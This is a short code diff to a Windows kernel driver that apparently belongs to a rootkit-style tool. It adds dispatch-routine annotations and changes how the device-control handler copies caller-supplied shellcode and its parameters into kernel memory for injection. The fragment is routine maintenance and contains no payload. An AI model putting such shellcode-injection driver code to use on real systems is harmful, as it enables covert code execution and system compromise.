@@ -13,6 +13,7 @@
 * Returns:
 * @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
 */
+_Function_class_(DRIVER_DISPATCH)
 _IRQL_requires_max_(DISPATCH_LEVEL)
 _IRQL_requires_same_
 NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
@@ -847,7 +848,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		shellcodeInfo.Parameter3Size = data->Parameter3Size;
 
 		MemoryAllocator<PVOID> shellcode(shellcodeInfo.ShellcodeSize);
-		status = shellcode.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize, UserMode);
+		status = shellcode.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -856,7 +857,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		// Copy parameters
 		if (shellcodeInfo.Parameter1Size > 0) {
 			MemoryAllocator<PVOID> parameter1(shellcodeInfo.Parameter1Size);
-			status = parameter1.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size, UserMode);
+			status = parameter1.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
 
 			if (!NT_SUCCESS(status))
 				break;
@@ -865,7 +866,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 		if (shellcodeInfo.Parameter2Size > 0) {
 			MemoryAllocator<PVOID> parameter2(shellcodeInfo.Parameter2Size);
-			status = parameter2.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size, UserMode);
+			status = parameter2.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
 
 			if (!NT_SUCCESS(status))
 				break;
@@ -1351,6 +1352,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 * Returns:
 * @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
 */
+_Function_class_(DRIVER_DISPATCH)
 _IRQL_requires_max_(DISPATCH_LEVEL)
 _IRQL_requires_same_
 NTSTATUS NidhoggCreateClose(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
